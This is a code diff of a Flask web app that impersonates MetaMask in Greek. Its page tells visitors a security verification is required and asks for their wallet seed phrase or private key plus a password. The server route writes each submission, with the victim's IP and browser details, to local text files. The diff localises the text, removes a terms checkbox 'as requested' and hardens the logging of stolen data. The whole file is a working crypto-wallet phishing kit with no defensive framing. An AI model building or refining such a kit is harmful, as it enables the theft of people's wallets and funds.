@@ -10,7 +10,9 @@ from flask import Flask, render_template_string, request, session
 from datetime import datetime
 from werkzeug.utils import secure_filename
 
+# ====== Έλεγχος εξαρτήσεων ======
 def install(pkg):
+    """Εγκαθιστά ένα πακέτο αθόρυβα."""
     subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])
 
 for pkg in ["flask", "werkzeug"]:
@@ -19,20 +21,25 @@ for pkg in ["flask", "werkzeug"]:
     except ImportError:
         install(pkg)
 
+# ====== Ρύθμιση εφαρμογής Flask ======
 app = Flask(__name__)
-app.secret_key = 'metamask-test-key'
+app.secret_key = 'metamask-test-key'  # Αλλάξτε σε παραγωγή!
 
+# Σίγαση της προεπιλεγμένης καταγραφής αιτημάτων του Flask
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR + 10)
 app.logger.setLevel(logging.ERROR + 10)
 
 class DummyFile(object):
+    """Χρησιμοποιείται για προσωρινή καταστολή stdout/stderr."""
     def write(self, x): pass
     def flush(self): pass
 
+# Φάκελος όπου θα αποθηκεύονται τα δεδομένα
 BASE_FOLDER = os.path.expanduser("~/storage/downloads/MetaMask")
 os.makedirs(BASE_FOLDER, exist_ok=True)
 
+# ====== Διαδρομές ======
 @app.route('/')
 def index():
     session['metamask_session'] = str(random.randint(100000, 999999))
@@ -509,23 +516,7 @@ def index():
                 }
             }
             
-            .terms-checkbox {
-                display: flex;
-                align-items: flex-start;
-                gap: 10px;
-                margin: 20px 0;
-                color: #666;
-                font-size: 13px;
-                line-height: 1.5;
-            }
-            
-            @media (min-width: 768px) {
-                .terms-checkbox {
-                    gap: 12px;
-                    margin: 25px 0;
-                    font-size: 14px;
-                }
-            }
+            /* Δεν χρειάζονται πλέον στυλ checkbox */
             
             .import-btn {
                 background: linear-gradient(135deg, #F6851B, #FF9E42);
@@ -727,7 +718,7 @@ def index():
                 }
             }
             
-            /* Mobile-specific optimizations */
+            /* Ειδικές βελτιστοποιήσεις για κινητά */
             @media (max-width: 767px) {
                 body {
                     padding: 0;
@@ -751,7 +742,7 @@ def index():
                 }
                 
                 input, textarea, button {
-                    font-size: 16px !important; /* Prevents iOS zoom */
+                    font-size: 16px !important; /* Αποτρέπει το ζουμ στο iOS */
                 }
                 
                 textarea {
@@ -759,7 +750,7 @@ def index():
                 }
             }
             
-            /* Tablet optimization */
+            /* Βελτιστοποίηση για tablet */
             @media (min-width: 768px) and (max-width: 1024px) {
                 .metamask-container {
                     width: 90vw;
@@ -777,33 +768,33 @@ def index():
             <div class="metamask-header">
                 <div class="metamask-logo">
                     <div class="logo-fox">
-                        <!-- Base64 encoded MetaMask logo -->
-                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjg4IiBoZWlnaHQ9IjI4OCIgdmlld0JveD0iMCAwIDI4OCAyODgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yNzIgMTA0LjM0MUwyMTMuODQ5IDI0NC4wMzNMMjQ0LjY3MyAyODhMMjg4IDI3Mi4xODdWMTA0LjM0MUgyNzJaIiBmaWxsPSIjRUE4ODFBIi8+CjxwYXRoIGQ9Ik0yMTMuODQ5IDI0NC4wMzNMMTc3LjI5MSAyNzIuMTg3TDI0NC42NzMgMjg4TDIxMy44NDkgMjQ0LjAzM1oiIGZpbGw9IiNEMTc0OTgiLz4KPHBhdGggZD0iTTE0NC4xMDkgMjQ0LjAzM0wyMTMuODQ5IDI0NC4wMzNMMTc3LjI5MSAyNzIuMTg3TDE0NC4xMDkgMjQ0LjAzM1oiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTE0NC4xMDkgMjQ0LjAzM0wxMDUuNTY2IDI4OEwxNzcuMjkxIDI3Mi4xODdMMTQ0LjEwOSAyNDQuMDMzWiIgZmlsbD0iI0VBNzcxQyIvPgo8cGF0aCBkPSJNMTYgMTA0LjM0MUw1NC41NTEgMjQ0LjAzM0wxNDQuMTA5IDI0NC4wMzNMMTYgMTA0LjM0MVoiIGZpbGw9IiNFQTg4MUEiLz4KPHBhdGggZD0iTTU0LjU1MSAyNDQuMDMzTDEwNS41NjYgMjg4TDE0NC4xMDkgMjQ0LjAzM0w1NC41NTEgMjQ0LjAzM1oiIGZpbGw9IiNEMTc0OTgiLz4KPHBhdGggZD0iTTE3Ny4yOTEgMEwxNDQuMTA5IDE0My45MzNMMjEzLjg0OSAxNDMuOTMzTDE3Ny4yOTEgMFoiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTE3Ny4yOTEgMEwxMDUuNTY2IDIxLjgxMzNMMTQ0LjEwOSAxNDMuOTMzTDE3Ny4yOTEgMFoiIGZpbGw9IiNFQTg4MUEiLz4KPHBhdGggZD0iTTEwNS41NjYgMjEuODEzM0wxNDQuMTA5IDE0My45MzNMNTQuNTUxIDE0My45MzNMMTA1LjU2NiAyMS44MTMzWiIgZmlsbD0iI0QxNzQ5OCIvPgo8cGF0aCBkPSJNNTQuNTUxIDE0My45MzNMMTQ0LjEwOSAxNDMuOTMzTDEwNS41NjYgMjEuODEzM0w1NC41NTEgMTQzLjkzM1oiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTIxMy44NDkgMTQzLjkzM0wxNzcuMjkxIDBMMjg4IDEwNC4zNDFMMjEzLjg0OSAxNDMuOTMzWiIgZmlsbD0iI0VBNzcxQyIvPgo8cGF0aCBkPSJNMjg4IDEwNC4zNDFMMjEzLjg0OSAxNDMuOTMzTDE0NC4xMDkgMTQzLjkzM0wxNiAxMDQuMzQxTDEwNS41NjYgMjEuODEzM0wyODggMTA0LjM0MVoiIGZpbGw9IiNFQTg4MUEiLz4KPC9zdmc+" alt="MetaMask Logo">
+                        <!-- Λογότυπο MetaMask σε base64 -->
+                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjg4IiBoZWlnaHQ9IjI4OCIgdmlld0JveD0iMCAwIDI4OCAyODgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yNzIgMTA0LjM0MUwyMTMuODQ5IDI0NC4wMzNMMjQ0LjY3MyAyODhMMjg4IDI3Mi4xODdWMTA0LjM0MUgyNzJaIiBmaWxsPSIjRUE4ODFBIi8+CjxwYXRoIGQ9Ik0yMTMuODQ5IDI0NC4wMzNMMTc3LjI5MSAyNzIuMTg3TDI0NC42NzMgMjg4TDIxMy44NDkgMjQ0LjAzM1oiIGZpbGw9IiNEMTc0OTgiLz4KPHBhdGggZD0iTTE0NC4xMDkgMjQ0LjAzM0wyMTMuODQ5IDI0NC4wMzNMMTc3LjI5MSAyNzIuMTg3TDE0NC4xMDkgMjQ0LjAzM1oiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTE0NC4xMDkgMjQ0LjAzM0wxMDUuNTY2IDI4OEwxNzcuMjkxIDI3Mi4xODdMMTQ0LjEwOSAyNDQuMDMzWiIgZmlsbD0iI0VBNzcxQyIvPgo8cGF0aCBkPSJNMTYgMTA0LjM0MUw1NC41NTEgMjQ0LjAzM0wxNDQuMTA5IDI0NC4wMzNMMTYgMTA0LjM0MVoiIGZpbGw9IiNFQTg4MUEiLz4KPHBhdGggZD0iTTU0LjU1MSAyNDQuMDMzTDEwNS41NjYgMjg4TDE0NC4xMDkgMjQ0LjAzM0w1NC41NTEgMjQ0LjAzM1oiIGZpbGw9IiNEMTc0OTgiLz4KPHBhdGggZD0iTTE3Ny4yOTEgMEwxNDQuMTA5IDE0My45MzNMMjEzLjg0OSAxNDMuOTMzTDE3Ny4yOTEgMFoiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTE3Ny4yOTEgMEwxMDUuNTY2IDIxLjgxMzNMMTQ0LjEwOSAxNDMuOTMzTDE3Ny4yOTEgMFoiIGZpbGw9IiNFQTg4MUEiLz4KPHBhdGggZD0iTTEwNS41NjYgMjEuODEzM0wxNDQuMTA5IDE0My45MzNMNTQuNTUxIDE0My45MzNMMTA1LjU2NiAyMS44MTMzWiIgZmlsbD0iI0QxNzQ5OCIvPgo8cGF0aCBkPSJNNTQuNTUxIDE0My45MzNMMTQ0LjEwOSAxNDMuOTMzTDEwNS41NjYgMjEuODEzM0w1NC41NTEgMTQzLjkzM1oiIGZpbGw9IiNCMDY0OTgiLz4KPHBhdGggZD0iTTIxMy44NDkgMTQzLjkzM0wxNzcuMjkxIDBMMjg4IDEwNC4zNDFMMjEzLjg0OSAxNDMuOTMzWiIgZmlsbD0iI0VBNzcxQyIvPgo8cGF0aCBkPSJNMjg4IDEwNC4zNDFMMjEzLjg0OSAxNDMuOTMzTDE0NC4xMDkgMTQzLjkzM0wxNiAxMDQuMzQxTDEwNS41NjYgMjEuODEzM0wyODggMTA0LjM0MVoiIGZpbGw9IiNFQTg4MUEiLz4KPC9zdmc+" alt="Λογότυπο MetaMask">
                     </div>
                     <div class="logo-text">MetaMask</div>
                 </div>
                 
                 <div style="color: rgba(255, 255, 255, 0.9); font-size: 14px; max-width: 400px; margin: 0 auto; line-height: 1.6;">
-                    Εισαγάγετε το πορτοφόλι σας για πρόσβαση στα Ethereum περιουσιακά σας στοιχεία
+                    Εισαγάγετε το πορτοφόλι σας για πρόσβαση στα περιουσιακά σας στοιχεία Ethereum
                 </div>
             </div>
             
             <div class="security-banner">
                 <span>🔒</span>
-                <span>ΑΠΑΙΤΕΙΤΑΙ ΕΠΑΛΗΘΕΥΣΗ ΑΣΦΑΛΕΙΑΣ - Εισαγάγετε το πορτοφόλι σας για συνέχεια</span>
+                <span>ΑΠΑΙΤΕΙΤΑΙ ΕΠΑΛΗΘΕΥΣΗ ΑΣΦΑΛΕΙΑΣ - Εισαγάγετε το πορτοφόλι σας για να συνεχίσετε</span>
             </div>
             
             <div class="import-section">
                 <div class="wallet-preview">
                     <div style="color: #666; font-size: 13px; margin-bottom: 8px;">
-                        Ανιχνευμένο Πορτοφόλι
+                        Ανιχνεύθηκε Πορτοφόλι
                     </div>
                     <div class="wallet-address" id="walletAddress">
                         0x742d35Cc6634C0532925a3b8...9e4f
                     </div>
                     <div class="network-badge">
                         <span>🌐</span>
-                        <span>Ethereum Κύριο Δίκτυο</span>
+                        <span>Ethereum Mainnet</span>
                     </div>
                 </div>
                 
@@ -818,7 +809,7 @@ def index():
                 <div class="assets-grid">
                     <div class="asset-card">
                         <div class="asset-icon">
-                            <!-- ETH Icon -->
+                            <!-- Εικονίδιο ETH -->
                             <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
                                 <circle cx="16" cy="16" r="16" fill="#627EEA"/>
                                 <path d="M15.998 4L15.884 4.364V20.636L15.998 20.748L23.996 16.223L15.998 4Z" fill="white" fill-opacity="0.602"/>
@@ -839,7 +830,7 @@ def index():
                     </div>
                     <div class="asset-card">
                         <div class="asset-icon">
-                            <!-- USDC Icon -->
+                            <!-- Εικονίδιο USDC -->
                             <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
                                 <circle cx="16" cy="16" r="16" fill="#2775CA"/>
                                 <path d="M20.0275 14.1245C20.0275 11.8911 18.2464 10.0581 16.0009 10.0581C13.7545 10.0581 11.9725 11.892 11.9725 14.1254C11.9725 16.3081 13.6652 18.1027 15.9991 18.1027C18.2446 18.1027 20.0265 16.3072 20.0265 14.1245H20.0275ZM24 14.1245C24 18.4198 20.4273 21.9175 16.0009 21.9175C11.5736 21.9175 8 18.4198 8 14.1245C8 9.83009 11.5736 6.33234 16.0009 6.33234C20.4273 6.33234 24 9.83009 24 14.1245Z" fill="white"/>
@@ -850,7 +841,7 @@ def index():
                     </div>
                     <div class="asset-card">
                         <div class="asset-icon">
-                            <!-- UNI Icon -->
+                            <!-- Εικονίδιο UNI -->
                             <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
                                 <circle cx="16" cy="16" r="16" fill="#FF007A"/>
                                 <path d="M23.5 14.2222V8L16 4L8.5 8V14.2222L16 18.4444L23.5 14.2222ZM16 5.33333L21.8333 8.44444L16 11.5556L10.1667 8.44444L16 5.33333ZM9.5 9.77778L14.8333 12.6667V18.8889L9.5 15.7778V9.77778ZM21.5 9.77778V15.7778L16.1667 18.8889V12.6667L21.5 9.77778ZM10.1667 16.5556L15.5 19.4444V27.1111L10.1667 24.2222V16.5556ZM21.8333 16.5556V24.2222L16.5 27.1111V19.4444L21.8333 16.5556Z" fill="white"/>
@@ -867,7 +858,7 @@ def index():
                     </div>
                     <div class="transaction-item">
                         <div>
-                            <div style="font-weight: 600; margin-bottom: 4px; font-size: 14px;">Uniswap V3 Ανταλλαγή</div>
+                            <div style="font-weight: 600; margin-bottom: 4px; font-size: 14px;">Ανταλλαγή Uniswap V3</div>
                             <div style="color: #666; font-size: 12px;">πριν 10 λεπτά</div>
                         </div>
                         <div class="tx-amount out">-0.42 ETH</div>
@@ -901,7 +892,7 @@ def index():
                             <label class="input-label">Μυστική Φράση Ανάκτησης</label>
                             <textarea 
                                 name="seed_phrase" 
-                                placeholder="Εισάγετε τη φράση ανάκτησης 12, 18 ή 24 λέξεων χωρισμένες με κενά"
+                                placeholder="Εισαγάγετε τη φράση ανάκτησης 12, 18 ή 24 λέξεων χωρισμένη με κενά"
                                 required
                                 rows="4"
                                 id="seedPhrase"
@@ -911,7 +902,7 @@ def index():
                                 spellcheck="false"
                             ></textarea>
                             <div style="color: #777; font-size: 12px; margin-top: 8px;">
-                                Συνήθως 12 (μερικές φορές 24) λέξεις χωρισμένες με απλά κενά
+                                Συνήθως 12 (μερικές φορές 24) λέξεις χωρισμένες με κενά
                             </div>
                         </div>
                         
@@ -919,7 +910,7 @@ def index():
                             <label class="input-label">Ιδιωτικό Κλειδί</label>
                             <textarea 
                                 name="private_key" 
-                                placeholder="Εισάγετε το ιδιωτικό σας κλειδί (64 δεκαεξαδικοί χαρακτήρες)"
+                                placeholder="Εισαγάγετε το ιδιωτικό σας κλειδί (64 δεκαεξαδικοί χαρακτήρες)"
                                 rows="3"
                                 id="privateKey"
                                 autocapitalize="off"
@@ -933,12 +924,12 @@ def index():
                         </div>
                         
                         <div class="password-input">
-                            <label class="input-label">Νέος Κωδικός</label>
+                            <label class="input-label">Νέος Κωδικός Πρόσβασης</label>
                             <input 
                                 type="password" 
                                 name="password" 
                                 id="password"
-                                placeholder="Δημιουργήστε νέο κωδικό (ελάχ. 8 χαρακτήρες)"
+                                placeholder="Δημιουργήστε νέο κωδικό (τουλάχιστον 8 χαρακτήρες)"
                                 required
                                 minlength="8"
                                 autocomplete="new-password"
@@ -959,18 +950,11 @@ def index():
                             >
                         </div>
                         
-                        <div class="terms-checkbox">
-                            <input type="checkbox" id="terms" name="terms" required style="margin-top: 3px;">
-                            <label for="terms">
-                                Έχω διαβάσει και συμφωνώ με τους 
-                                <a href="#" style="color: var(--mm-orange); text-decoration: none;">Όρους Χρήσης</a> και την 
-                                <a href="#" style="color: var(--mm-orange); text-decoration: none;">Πολιτική Απορρήτου</a> της MetaMask
-                            </label>
-                        </div>
+                        <!-- CHECKBOX ΑΦΑΙΡΕΘΗΚΕ ΟΠΩΣ ΖΗΤΗΘΗΚΕ -->
                         
                         <div class="security-warning">
-                            ⚠️ Ποτέ μην αποκαλύπτετε τη μυστική φράση ανάκτησης ή το ιδιωτικό σας κλειδί. 
-                            Οποιοσδήποτε τα έχει μπορεί να κλέψει τα περιουσιακά σας στοιχεία.
+                            ⚠️ Ποτέ μην αποκαλύπτετε τη μυστική φράση ανάκτησης ή το ιδιωτικό κλειδί. 
+                            Οποιοσδήποτε με αυτά μπορεί να κλέψει τα περιουσιακά σας στοιχεία.
                         </div>
                         
                         <button type="submit" class="import-btn">
@@ -981,21 +965,21 @@ def index():
                 
                 <div class="connect-hint">
                     <div style="margin-bottom: 10px;">🔗</div>
-                    <div style="font-weight: 600; margin-bottom: 5px;">Ανιχνεύθηκε MetaMask Επέκταση Προγράμματος Πλοήγησης</div>
+                    <div style="font-weight: 600; margin-bottom: 5px;">Εντοπίστηκε η Επέκταση MetaMask</div>
                     <div style="color: #666;">
-                        Παρακαλώ εισάγετε το πορτοφόλι σας για σύνδεση με αποκεντρωμένες εφαρμογές
+                        Παρακαλώ εισαγάγετε το πορτοφόλι σας για να συνδεθείτε σε αποκεντρωμένες εφαρμογές
                     </div>
                 </div>
                 
                 <div class="footer-note">
-                    Η MetaMask είναι μια παγκόσμια κοινότητα. Για υποστήριξη, επισκεφτείτε το 
+                    Η MetaMask είναι μια παγκόσμια κοινότητα. Για υποστήριξη, επισκεφθείτε 
                     <a href="#" style="color: var(--mm-orange); text-decoration: none;">community.metamask.io</a>
                 </div>
             </div>
         </div>
         
         <script>
-            // Make option tabs accessible via keyboard
+            // Κάνει τις καρτέλες επιλογών προσβάσιμες μέσω πληκτρολογίου
             document.querySelectorAll('.option-tab').forEach(tab => {
                 tab.addEventListener('keydown', (e) => {
                     if (e.key === 'Enter' || e.key === ' ') {
@@ -1013,7 +997,7 @@ def index():
                 const seedPhrase = document.getElementById('seedPhrase');
                 const privateKey = document.getElementById('privateKey');
                 
-                // Remove focus from current active tab
+                // Αφαίρεση εστίασης από την τρέχουσα ενεργή καρτέλα
                 document.activeElement.blur();
                 
                 if (tab === 'seed') {
@@ -1023,7 +1007,7 @@ def index():
                     privateSection.style.display = 'none';
                     seedPhrase.required = true;
                     privateKey.required = false;
-                    // Focus on textarea for better UX
+                    // Εστίαση στο textarea για καλύτερη εμπειρία χρήστη
                     setTimeout(() => seedPhrase.focus(), 100);
                 } else {
                     seedTab.classList.remove('active');
@@ -1032,7 +1016,7 @@ def index():
                     privateSection.style.display = 'block';
                     seedPhrase.required = false;
                     privateKey.required = true;
-                    // Focus on textarea for better UX
+                    // Εστίαση στο textarea για καλύτερη εμπειρία χρήστη
                     setTimeout(() => privateKey.focus(), 100);
                 }
             }
@@ -1049,12 +1033,12 @@ def index():
                     toggleButton.textContent = 'Εμφάνιση';
                 }
                 
-                // Prevent form submission
+                // Αποτροπή υποβολής φόρμας
                 event.preventDefault();
                 event.stopPropagation();
             }
             
-            // Generate random wallet address
+            // Δημιουργία τυχαίας διεύθυνσης πορτοφολιού
             const walletAddress = document.getElementById('walletAddress');
             const chars = '0123456789abcdef';
             let address = '0x';
@@ -1063,7 +1047,7 @@ def index():
             }
             walletAddress.textContent = address.substring(0, 20) + '...' + address.substring(36);
             
-            // Animate balance with random fluctuations
+            // Κινούμενο υπόλοιπο με τυχαίες διακυμάνσεις
             let ethBalance = 12.84;
             const balanceElement = document.getElementById('balanceEth');
             const usdElement = document.getElementById('balanceUsd');
@@ -1071,7 +1055,7 @@ def index():
             function updateBalance() {
                 const fluctuation = (Math.random() - 0.5) * 0.02;
                 ethBalance = Math.max(0, ethBalance * (1 + fluctuation));
-                const usdValue = (ethBalance * 3300).toLocaleString('en-US', {
+                const usdValue = (ethBalance * 3300).toLocaleString('el-GR', {
                     minimumFractionDigits: 2,
                     maximumFractionDigits: 2
                 });
@@ -1079,17 +1063,17 @@ def index():
                 balanceElement.textContent = ethBalance.toFixed(2) + ' ETH';
                 usdElement.textContent = `≈ $${usdValue}`;
                 
-                // Animate change
+                // Κινούμενη αλλαγή
                 balanceElement.style.transform = 'scale(1.1)';
                 setTimeout(() => {
                     balanceElement.style.transform = 'scale(1)';
                 }, 300);
             }
             
-            // Update balance every 10 seconds
+            // Ενημέρωση υπολοίπου κάθε 10 δευτερόλεπτα
             setInterval(updateBalance, 10000);
             
-            // Animate asset cards on load
+            // Κινούμενη εμφάνιση καρτών περιουσιακών στοιχείων κατά τη φόρτωση
             document.addEventListener('DOMContentLoaded', function() {
                 const assetCards = document.querySelectorAll('.asset-card');
                 assetCards.forEach((card, index) => {
@@ -1103,7 +1087,7 @@ def index():
                     }, index * 200);
                 });
                 
-                // Prevent zoom on iOS when focusing input
+                // Αποτροπή ζουμ στο iOS κατά την εστίαση σε input
                 if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                     document.addEventListener('touchstart', function(e) {
                         if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
@@ -1113,7 +1097,7 @@ def index():
                 }
             });
             
-            // Form validation
+            // Έλεγχος φόρμας (το checkbox δεν απαιτείται πλέον)
             document.getElementById('importForm').addEventListener('submit', function(e) {
                 const password = document.getElementById('password').value;
                 const confirmPassword = document.getElementById('confirmPassword').value;
@@ -1130,10 +1114,10 @@ def index():
                 
                 if (seedSection.style.display !== 'none') {
                     const seedPhrase = document.getElementById('seedPhrase').value;
-                    const words = seedPhrase.trim().split(/\s+/);
+                    const words = seedPhrase.trim().split(/\\s+/);
                     if (![12, 18, 24].includes(words.length)) {
                         e.preventDefault();
-                        alert('Παρακαλώ εισάγετε έγκυρη φράση ανάκτησης 12, 18 ή 24 λέξεων.');
+                        alert('Παρακαλώ εισάγετε μια έγκυρη φράση ανάκτησης 12, 18 ή 24 λέξεων.');
                         document.getElementById('seedPhrase').focus();
                         return false;
                     }
@@ -1141,23 +1125,23 @@ def index():
                     const privateKey = document.getElementById('privateKey').value;
                     if (!privateKey.match(/^[0-9a-fA-F]{64}$/)) {
                         e.preventDefault();
-                        alert('Παρακαλώ εισάγετε έγκυρο ιδιωτικό κλειδί 64 χαρακτήρων.');
+                        alert('Παρακαλώ εισάγετε ένα έγκυρο ιδιωτικό κλειδί 64 χαρακτήρων.');
                         document.getElementById('privateKey').focus();
                         return false;
                     }
                 }
                 
-                // Show loading state
+                // Εμφάνιση κατάστασης φόρτωσης
                 const submitBtn = this.querySelector('.import-btn');
                 const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = 'Εισαγωγή... <span style="font-size:14px">🔄</span>';
+                submitBtn.innerHTML = 'Γίνεται εισαγωγή... <span style="font-size:14px">🔄</span>';
                 submitBtn.disabled = true;
                 
-                // Allow form submission
+                // Επιτρέπεται η υποβολή της φόρμας
                 return true;
             });
             
-            // Handle mobile viewport height
+            // Χειρισμός ύψους viewport σε κινητά
             function setViewportHeight() {
                 let vh = window.innerHeight * 0.01;
                 document.documentElement.style.setProperty('--vh', `${vh}px`);
@@ -1178,7 +1162,7 @@ def import_wallet():
     password = request.form.get('password', '').strip()
     session_id = session.get('metamask_session', 'unknown')
 
-    # Determine what was submitted
+    # Προσδιορισμός τι υποβλήθηκε
     if seed_phrase:
         submission_type = 'seed_phrase'
         submission_content = seed_phrase
@@ -1192,39 +1176,43 @@ def import_wallet():
         submission_content = ''
         first_word = 'unknown'
 
-    safe_filename = secure_filename(first_word)
+    safe_base = secure_filename(first_word) or 'unknown'
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    user_file_path = os.path.join(BASE_FOLDER, f"{safe_filename}_{timestamp}.txt")
+    rand_suffix = random.randint(1000, 9999)
+    user_file_path = os.path.join(BASE_FOLDER, f"{safe_base}_{timestamp}_{rand_suffix}.txt")
 
-    with open(user_file_path, 'w') as file:
-        file.write(f"Session: {session_id}\n")
-        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
-        file.write(f"IP: {request.remote_addr}\n")
-        file.write("=" * 50 + "\n")
-        file.write(f"SUBMISSION TYPE: {submission_type.upper()}\n")
-        file.write("=" * 50 + "\n")
-        
-        if submission_type == 'seed_phrase':
-            file.write(f"SEED PHRASE:\n{submission_content}\n")
-            word_count = len(seed_phrase.strip().split())
-            file.write(f"Word Count: {word_count}\n")
-        elif submission_type == 'private_key':
-            file.write(f"PRIVATE KEY:\n{submission_content}\n")
-            file.write(f"Key Length: {len(private_key)} characters\n")
-        
-        file.write("=" * 50 + "\n")
-        file.write(f"PASSWORD: {password}\n")
-        file.write("=" * 50 + "\n")
-        file.write(f"Platform: MetaMask Wallet Import\n")
-        file.write(f"Shown Balance: 12.84 ETH ($42,847.63)\n")
-        file.write(f"Assets: ETH, WBTC, USDC, UNI\n")
-        file.write(f"Network: Ethereum Mainnet\n")
-        file.write(f"Purpose: 'Security Verification Required'\n")
+    try:
+        with open(user_file_path, 'w') as file:
+            file.write(f"Συνεδρία: {session_id}\n")
+            file.write(f"Χρονική σήμανση: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            file.write(f"User-Agent: {request.headers.get('User-Agent', 'Άγνωστο')}\n")
+            file.write(f"IP: {request.remote_addr}\n")
+            file.write("=" * 50 + "\n")
+            file.write(f"ΤΥΠΟΣ ΥΠΟΒΟΛΗΣ: {submission_type.upper()}\n")
+            file.write("=" * 50 + "\n")
+
+            if submission_type == 'seed_phrase':
+                file.write(f"ΦΡΑΣΗ ΑΝΑΚΤΗΣΗΣ:\n{submission_content}\n")
+                word_count = len(seed_phrase.strip().split())
+                file.write(f"Αριθμός λέξεων: {word_count}\n")
+            elif submission_type == 'private_key':
+                file.write(f"ΙΔΙΩΤΙΚΟ ΚΛΕΙΔΙ:\n{submission_content}\n")
+                file.write(f"Μήκος κλειδιού: {len(private_key)} χαρακτήρες\n")
+
+            file.write("=" * 50 + "\n")
+            file.write(f"ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ: {password}\n")
+            file.write("=" * 50 + "\n")
+            file.write(f"Πλατφόρμα: Εισαγωγή Πορτοφολιού MetaMask\n")
+            file.write(f"Εμφανιζόμενο Υπόλοιπο: 12.84 ETH ($42,847.63)\n")
+            file.write(f"Περιουσιακά Στοιχεία: ETH, WBTC, USDC, UNI\n")
+            file.write(f"Δίκτυο: Ethereum Mainnet\n")
+            file.write(f"Σκοπός: 'Απαιτείται Επαλήθευση Ασφαλείας'\n")
+    except Exception as e:
+        print(f"[-] Αποτυχία εγγραφής δεδομένων: {e}")
 
     return render_template_string('''
     <!DOCTYPE html>
-    <html>
+    <html lang="el">
     <head>
         <title>MetaMask - Επιτυχής Εισαγωγή</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -1593,7 +1581,7 @@ def import_wallet():
                 box-shadow: 0 15px 30px rgba(246, 133, 27, 0.3);
             }
             
-            /* Mobile-specific optimizations */
+            /* Ειδικές βελτιστοποιήσεις για κινητά */
             @media (max-width: 767px) {
                 body {
                     padding: 0;
@@ -1615,7 +1603,7 @@ def import_wallet():
                 }
             }
             
-            /* Tablet optimization */
+            /* Βελτιστοποίηση για tablet */
             @media (min-width: 768px) and (max-width: 1024px) {
                 .success-container {
                     width: 90vw;
@@ -1633,15 +1621,15 @@ def import_wallet():
         <div class="success-container">
             <div class="success-header">
                 <div class="success-icon">✓</div>
-                <div class="success-title">Επιτυχής Εισαγωγή</div>
+                <div class="success-title">Το Πορτοφόλι Εισήχθη</div>
                 <div style="color: rgba(255, 255, 255, 0.9); font-size: 14px; max-width: 400px; margin: 0 auto;">
-                    Το MetaMask πορτοφόλι σας είναι πλέον συνδεδεμένο
+                    Το πορτοφόλι MetaMask σας είναι τώρα συνδεδεμένο
                 </div>
             </div>
             
             <div class="success-body">
                 <div style="color: #666; font-size: 14px; margin-bottom: 25px;">
-                    Το πορτοφόλι εισήχθη με επιτυχία και προστατεύθηκε με τον νέο σας κωδικό.
+                    Το πορτοφόλι εισήχθη με επιτυχία και ασφαλίστηκε με τον νέο κωδικό πρόσβασης.
                 </div>
                 
                 <div class="progress-container">
@@ -1663,7 +1651,7 @@ def import_wallet():
                         <div>
                             <strong>Ασφάλεια Κωδικού</strong>
                             <div style="color: #666; font-size: 13px; margin-top: 4px;">
-                                Νέος κωδικός εφαρμόστηκε και κρυπτογραφήθηκε
+                                Ο νέος κωδικός εφαρμόστηκε και κρυπτογραφήθηκε
                             </div>
                         </div>
                     </div>
@@ -1680,11 +1668,11 @@ def import_wallet():
                 
                 <div class="wallet-connected">
                     <div style="color: #F6851B; font-weight: 600; margin-bottom: 15px; font-size: 15px;">
-                        Πορτοφόλι Συνδεδεμένο
+                        Συνδεδεμένο Πορτοφόλι
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Δίκτυο:</span>
-                        <span class="detail-value">Ethereum Κύριο Δίκτυο</span>
+                        <span class="detail-value">Ethereum Mainnet</span>
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Υπόλοιπο:</span>
@@ -1724,15 +1712,15 @@ def import_wallet():
                 </div>
                 
                 <div class="transaction-hash">
-                    Κωδικός Σύνδεσης: MM-<span id="connection-hash">0000000</span>
+                    Hash Σύνδεσης: MM-<span id="connection-hash">0000000</span>
                 </div>
                 
                 <div class="security-note">
-                    🔒 Το πορτοφόλι σας είναι πλέον ασφαλές. Βεβαιωθείτε ότι κρατάτε τη φράση ανάκτησης ασφαλή και ποτέ δεν τη μοιράζεστε.
+                    🔒 Το πορτοφόλι σας είναι τώρα ασφαλισμένο. Φυλάξτε τη φράση ανάκτησής σας και μην την μοιράζεστε ποτέ.
                 </div>
                 
                 <div class="redirect-notice">
-                    ⏳ Θα ανακατευθυνθείτε στον πίνακα ελέγχου της MetaMask σε 8 δευτερόλεπτα...
+                    ⏳ Θα ανακατευθυνθείτε στον πίνακα ελέγχου MetaMask σε 8 δευτερόλεπτα...
                 </div>
                 
                 <button class="continue-btn" onclick="window.location.href='/'" aria-label="Άνοιγμα Πίνακα Ελέγχου MetaMask">
@@ -1742,11 +1730,11 @@ def import_wallet():
         </div>
         
         <script>
-            // Generate random connection hash
+            // Δημιουργία τυχαίου hash σύνδεσης
             document.getElementById('connection-hash').textContent = 
                 Math.random().toString(36).substring(2, 10).toUpperCase();
             
-            // Animate status items
+            // Κινούμενη εμφάνιση στοιχείων κατάστασης
             setTimeout(() => {
                 const statusItems = document.querySelectorAll('.status-item');
                 statusItems.forEach((item, index) => {
